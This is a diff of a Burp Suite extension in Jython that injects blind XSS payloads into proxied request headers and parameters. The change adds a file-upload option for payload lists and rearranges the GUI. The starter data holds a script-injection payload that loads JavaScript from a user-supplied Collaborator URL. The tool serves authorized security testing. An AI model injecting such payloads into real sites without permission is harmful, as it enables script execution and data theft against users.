@@ -4,11 +4,13 @@ from burp import IHttpListener
 from burp import IInterceptedProxyMessage
 from burp import IMessageEditorController
 from burp import IContextMenuInvocation
-from javax.swing import JLabel, JTextField, JOptionPane, JTabbedPane, JPanel, JButton, JMenuItem, JTable, JScrollPane, JCheckBox, BorderFactory, Box
+from javax.swing import (JLabel, JTextField, JOptionPane,
+    JTabbedPane, JPanel, JButton, JMenuItem, JTable, JScrollPane,
+    JCheckBox, BorderFactory, Box, JFileChooser)
 from javax.swing.border import EmptyBorder
-from java.awt import GridBagLayout, Dimension, GridBagConstraints, Color, FlowLayout, BorderLayout, Insets
+from java.awt import (GridBagLayout, Dimension, GridBagConstraints,
+    Color, FlowLayout, BorderLayout, Insets)
 from java.net import URL
-# from java.awt import Dimension, Color, Component, GridLayout, GridBagLayout, BorderLayout, FlowLayout, GridBagConstraints
 from javax import swing
 from javax.swing.table import AbstractTableModel, DefaultTableModel
 from javax.swing.event import TableModelEvent, TableModelListener
@@ -53,7 +55,6 @@ class PyRunnable(Runnable):
         self.args = args
         self.kwargs = kwargs
     
-    
     def run(self):
         self.target(*self.args, **self.kwargs)
 
@@ -76,7 +77,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
     _jLabelAbout = None
     _overwriteHeader = False
     _overwriteParam = False
-
 
     #
     # implement IBurpExtender
@@ -102,21 +102,19 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         self._layout = GridBagLayout()
         self._jPanel.setLayout(self._layout)
 
-        self._jPanel.setBounds(0, 0, 1000, 1000)
-        self._jLabelTechniques = JLabel("Your URL (my.burpcollaborator.net):")
-        self.createAnyView(self._jLabelTechniques, 0, 1, 2, 1, Insets(0, 0, 10, 0))
-
-        self._jTextFieldURL = JTextField("", 30)
-        self.createAnyView(self._jTextFieldURL, 2, 1, 6, 1, Insets(0, 0, 10, 0))
-
-
         self._jLabelTechniques = JLabel("Press to start:")
-        self.createAnyView(self._jLabelTechniques, 0, 0, 2, 1, Insets(0, 0, 10, 0))
+        self.createAnyView(self._jLabelTechniques, 0, 0, 3, 1, Insets(0, 0, 10, 0))
 
         self.submitSearchButton = swing.JButton(self.start_button_text, actionPerformed=self.active_flag)
         self.submitSearchButton.setBackground(Color.WHITE)
-        self.createAnyView(self.submitSearchButton, 2, 0, 6, 1, Insets(0, 0, 10, 0))
+        self.createAnyView(self.submitSearchButton, 3, 0, 6, 1, Insets(0, 0, 10, 0))
 
+        self._jPanel.setBounds(0, 0, 1000, 1000)
+        self._jLabelTechniques = JLabel("Your URL (my.burpcollaborator.net):")
+        self.createAnyView(self._jLabelTechniques, 0, 1, 3, 1, Insets(0, 0, 10, 0))
+
+        self._jTextFieldURL = JTextField("", 30)
+        self.createAnyView(self._jTextFieldURL, 3, 1, 6, 1, Insets(0, 0, 10, 0))
 
         self._tableModelPayloads = DefaultTableModel() 
         self._tableModelPayloads.addColumn("Payload")
@@ -130,83 +128,76 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         self._tableModelParams.addColumn("Parameter")
         self._tableModelParams.addColumn("Using")
 
-
         self._table = JTable(self._tableModelPayloads)
         self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
         self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 1))
         self._scrolltable = JScrollPane(self._table)
         self._scrolltable.setMinimumSize(Dimension(300, 200))
-        self.createAnyView(self._scrolltable, 0, 2, 2, 1, Insets(0, 0, 0, 10))
-
+        self.createAnyView(self._scrolltable, 0, 2, 3, 1, Insets(0, 0, 0, 10))
 
         self._table = JTable(self._tableModelHeaders)
         self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
         self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 2))
         self._scrolltable = JScrollPane(self._table)
         self._scrolltable.setMinimumSize(Dimension(300, 200))
-        self.createAnyView(self._scrolltable, 2, 2, 3, 1, Insets(0, 0, 0, 10))
-
+        self.createAnyView(self._scrolltable, 3, 2, 3, 1, Insets(0, 0, 0, 10))
 
         self._table = JTable(self._tableModelParams)
         self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
         self._table.getModel().addTableModelListener(MyTableModelListener(self._table, self, 3))
         self._scrolltable = JScrollPane(self._table)
         self._scrolltable.setMinimumSize(Dimension(300, 200))
-        self.createAnyView(self._scrolltable, 5, 2, 3, 1, Insets(0, 0, 0, 0))
-
+        self.createAnyView(self._scrolltable, 6, 2, 3, 1, Insets(0, 0, 0, 0))
 
         deletePayloadButton = swing.JButton('Delete',actionPerformed=self.deleteToPayload)
         deletePayloadButton.setBackground(Color.WHITE)
         self.createAnyView(deletePayloadButton, 0, 3, 1, 1, Insets(3, 0, 0, 0))
 
+        deletePayloadButton = swing.JButton('Upload',actionPerformed=self.uploadToPayload)
+        deletePayloadButton.setBackground(Color.WHITE)
+        self.createAnyView(deletePayloadButton, 1, 3, 1, 1, Insets(3, 0, 0, 0))
+
         addPayloadButton = swing.JButton('Add',actionPerformed=self.addToPayload)
         addPayloadButton.setBackground(Color.WHITE)
-        self.createAnyView(addPayloadButton, 1, 3, 1, 1, Insets(3, 0, 0, 10))
-
+        self.createAnyView(addPayloadButton, 2, 3, 1, 1, Insets(3, 0, 0, 10))
 
         deleteHeaderButton = swing.JButton('Delete',actionPerformed=self.deleteToHeader)
         deleteHeaderButton.setBackground(Color.WHITE)
-        self.createAnyView(deleteHeaderButton, 2, 3, 1, 1, Insets(3, 0, 0, 0))
+        self.createAnyView(deleteHeaderButton, 3, 3, 1, 1, Insets(3, 0, 0, 0))
 
         self._overwriteHeaderButton = swing.JButton('Overwrite',actionPerformed=self.overwriteHeader)
         self._overwriteHeaderButton.setBackground(Color.WHITE)
-        self.createAnyView(self._overwriteHeaderButton, 3, 3, 1, 1, Insets(3, 0, 0, 0))
+        self.createAnyView(self._overwriteHeaderButton, 4, 3, 1, 1, Insets(3, 0, 0, 0))
 
         addHeaderButton = swing.JButton('Add',actionPerformed=self.addToHeader)
         addHeaderButton.setBackground(Color.WHITE)
-        self.createAnyView(addHeaderButton, 4, 3, 1, 1, Insets(3, 0, 0, 10))
-
+        self.createAnyView(addHeaderButton, 5, 3, 1, 1, Insets(3, 0, 0, 10))
 
         deleteParamsButton = swing.JButton('Delete',actionPerformed=self.deleteToParams)
         deleteParamsButton.setBackground(Color.WHITE)
-        self.createAnyView(deleteParamsButton, 5, 3, 1, 1, Insets(3, 0, 0, 0))
+        self.createAnyView(deleteParamsButton, 6, 3, 1, 1, Insets(3, 0, 0, 0))
 
         self._overwriteParamButton = swing.JButton('Overwrite',actionPerformed=self.overwriteParam)
         self._overwriteParamButton.setBackground(Color.WHITE)
-        self.createAnyView(self._overwriteParamButton, 6, 3, 1, 1, Insets(3, 0, 0, 0))
+        self.createAnyView(self._overwriteParamButton, 7, 3, 1, 1, Insets(3, 0, 0, 0))
 
         addParamsButton = swing.JButton('Add',actionPerformed=self.addToParams)
         addParamsButton.setBackground(Color.WHITE)
-        self.createAnyView(addParamsButton, 7, 3, 1, 1, Insets(3, 0, 0, 0))
+        self.createAnyView(addParamsButton, 8, 3, 1, 1, Insets(3, 0, 0, 0))
         
-
         self._resultsTextArea = swing.JTextArea()
         resultsOutput = swing.JScrollPane(self._resultsTextArea)
         resultsOutput.setMinimumSize(Dimension(800,200))
-        self.createAnyView(resultsOutput, 0, 4, 8, 1, Insets(10, 0, 0, 0))
-
+        self.createAnyView(resultsOutput, 0, 4, 9, 1, Insets(10, 0, 0, 0))
 
         self.clearSearchButton = swing.JButton('Clear Search Output',actionPerformed=self.clearOutput)
-        self.createAnyView(self.clearSearchButton, 2, 5, 3, 1, Insets(3, 0, 0, 0))
-
+        self.createAnyView(self.clearSearchButton, 3, 6, 3, 1, Insets(3, 0, 0, 0))
 
         self._callbacks.customizeUiComponent(self._jPanel)
-
         self._callbacks.addSuiteTab(self)
-        # register ourselves as an HTTP listener
-        self._callbacks.registerHttpListener(self)
-
         self.starterPack()
+
+        self._callbacks.registerHttpListener(self)
 
         return
 
@@ -220,13 +211,12 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         self._jPanelConstraints.insets = insets
         self._jPanel.add(_component, self._jPanelConstraints)
 
-
     def starterPack(self):
         self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), [r'"><script src=${URL}$></script>', '1'])
         self._tableModelHeaders.insertRow(self._tableModelHeaders.getRowCount(), ['User-agent', '1'])
         self._tableModelParams.insertRow(self._tableModelParams.getRowCount(), ['test', '1'])
 
-    # run Query for Add to Queue Button
+
     def addToPayload(self, button):
         self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), ['', ''])
 
@@ -235,6 +225,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
     def addToParams(self, button):
         self._tableModelParams.insertRow(self._tableModelParams.getRowCount(), ['', ''])
+
+    def uploadToPayload(self, button):
+        self.jfc = JFileChooser("./")
+        self.jfc.setDialogTitle("Upload Payloads")
+        self._returnFileChooser = self.jfc.showDialog(None, "Open")
+        if (self._returnFileChooser == JFileChooser.APPROVE_OPTION):
+            selectedFile = self.jfc.getSelectedFile()
+            self.fileUpload(selectedFile)
 
     def deleteToPayload(self, button):
         self._tableModelPayloads.removeRow(self._tableModelPayloads.getRowCount()-1)
@@ -245,10 +243,13 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
     def deleteToParams(self, button):
         self._tableModelParams.removeRow(self._tableModelParams.getRowCount()-1)
 
-
-    # Clear GUI Output Function
     def clearOutput(self, button):
         self._resultsTextArea.setText("")
+
+    def fileUpload(self, path):
+        with open(str(path), "r") as f:
+            for line in f:
+                self._tableModelPayloads.insertRow(self._tableModelPayloads.getRowCount(), [str(line), '1'])
 
 
     def active_flag(self, button):
@@ -269,6 +270,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             self.status_flag = False
             self.submitSearchButton.setBackground(Color.WHITE)
             self.appendToResults("Proxy stop...")
+
 
     def overwriteHeader(self, button):
         if not self._overwriteHeader:
@@ -301,7 +303,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
             listHeader = re.findall('([\w-]+):\s?(.*)', requestString)
             dictRealHeaders = {x[0].lower():x[1] for x in listHeader}
-            # self.appendToResults(str(self._dictHeaders))
 
             for index, key in enumerate(self._dictPayloads_headers):
                 if key.lower() in dictRealHeaders.keys():
